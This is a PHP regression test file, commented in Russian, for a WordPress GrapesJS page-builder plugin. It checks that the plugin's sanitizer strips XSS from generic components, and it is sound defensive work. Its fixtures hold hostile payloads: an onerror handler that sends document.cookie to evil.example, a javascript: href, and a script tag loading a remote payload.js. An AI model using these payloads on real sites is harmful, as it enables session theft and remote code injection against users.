<?php

namespace WPGJBuilder\Tests\Phase7;

use WPGJBuilder\Sanitize\ProjectDataSanitizer;

defined( 'ABSPATH' ) || exit;

/**
 * Дев-only регрессия для находки независимого security review (Phase 7,
 * раздел 10 спеки): ProjectDataSanitizer::sanitize_component() раньше
 * НЕ санитизировал собственные attributes/tagName/content узла БЕЗ
 * data-wpb-block (обычный/нативный компонент GrapesJS, например
 * результат импорта/paste HTML — тот же вектор, что issue #3082 из
 * адверсариального корпуса спайка 4) — проверялись только значения
 * ВНУТРИ data-wpb-values для платформенных блоков. Закреплено тестами,
 * чтобы регрессия не прошла незамеченной при будущих правках.
 */
class Phase7Runner {

	public static function run() {
		return array(
			'sanitizer_strips_event_handler_from_generic_node' => self::check_strips_event_handler(),
			'sanitizer_neutralizes_javascript_href_on_generic_node' => self::check_neutralizes_javascript_href(),
			'sanitizer_forces_safe_tag_for_disallowed_tagname' => self::check_forces_safe_tag(),
			'sanitizer_still_processes_real_blocks_normally'   => self::check_real_block_unaffected(),
		);
	}

	private static function project_data_with_component( array $component ): array {
		return array(
			'pages'  => array(
				array(
					'frames' => array(
						array(
							'component' => array(
								'type'       => 'wrapper',
								'components' => array( $component ),
							),
						),
					),
				),
			),
			'styles' => array(),
		);
	}

	private static function first_component_after_sanitize( array $component ): array {
		$sanitized = ProjectDataSanitizer::sanitize( self::project_data_with_component( $component ) );
		return $sanitized['pages'][0]['frames'][0]['component']['components'][0];
	}

	private static function check_strips_event_handler() {
		$result = self::first_component_after_sanitize(
			array(
				'type'       => 'image',
				'tagName'    => 'img',
				'attributes' => array(
					'src'     => 'x',
					'onerror' => "fetch('https://evil.example/steal?c='+document.cookie)",
				),
				'components' => array(),
			)
		);

		$ok = ! array_key_exists( 'onerror', $result['attributes'] ) && 'x' === ( $result['attributes']['src'] ?? null );

		return array(
			'pass'   => $ok,
			'detail' => $ok
				? 'onerror удалён из узла без data-wpb-block, src (безопасный атрибут) сохранён'
				: 'ожидалось удаление onerror при сохранении обычного узла GrapesJS без data-wpb-block',
			'result' => array( 'attributes' => $result['attributes'] ),
		);
	}

	private static function check_neutralizes_javascript_href() {
		$result = self::first_component_after_sanitize(
			array(
				'type'       => 'link',
				'tagName'    => 'a',
				'attributes' => array(
					'href'    => 'javascript:alert(document.cookie)',
					'onclick' => 'steal()',
				),
				'content'    => 'click me',
				'components' => array(),
			)
		);

		$href           = $result['attributes']['href'] ?? '';
		$ok             = ! array_key_exists( 'onclick', $result['attributes'] ) && false === stripos( $href, 'javascript:' );

		return array(
			'pass'   => $ok,
			'detail' => $ok
				? 'onclick удалён, javascript: протокол в href нейтрализован'
				: 'ожидалось удаление onclick и нейтрализация javascript: в href',
			'result' => array( 'attributes' => $result['attributes'] ),
		);
	}

	private static function check_forces_safe_tag() {
		$result = self::first_component_after_sanitize(
			array(
				'type'       => 'script',
				'tagName'    => 'script',
				'attributes' => array( 'src' => 'https://evil.example/payload.js' ),
				'content'    => 'alert(1)',
				'components' => array(),
			)
		);

		$ok = 'script' !== $result['tagName'];

		return array(
			'pass'   => $ok,
			'detail' => $ok
				? sprintf( 'tagName "script" принудительно заменён на безопасный "%s"', $result['tagName'] )
				: 'ожидалось, что tagName="script" никогда не переживёт санитизацию как есть',
			'result' => array( 'tagName' => $result['tagName'] ),
		);
	}

	private static function check_real_block_unaffected() {
		$result = self::first_component_after_sanitize(
			array(
				'type'       => 'div',
				'attributes' => array(
					'data-wpb-block'  => 'test-cta',
					'data-wpb-values' => wp_json_encode( array( 'title' => '<script>alert(1)</script>Hello', 'button_label' => 'Go', 'button_link' => '#' ) ),
				),
				'components' => array(),
			)
		);

		$values = json_decode( $result['attributes']['data-wpb-values'], true );
		$ok     = is_array( $values ) && false === stripos( $values['title'] ?? '', '<script' ) && false !== stripos( $values['title'] ?? '', 'Hello' );

		return array(
			'pass'   => $ok,
			'detail' => $ok
				? 'платформенный блок (data-wpb-block) по-прежнему санитизируется через sanitize_values() как раньше — фикс не затронул существующий путь'
				: 'ожидалось, что обычный путь платформенных блоков продолжает работать как раньше',
			'result' => array( 'values' => $values ),
		);
	}
}
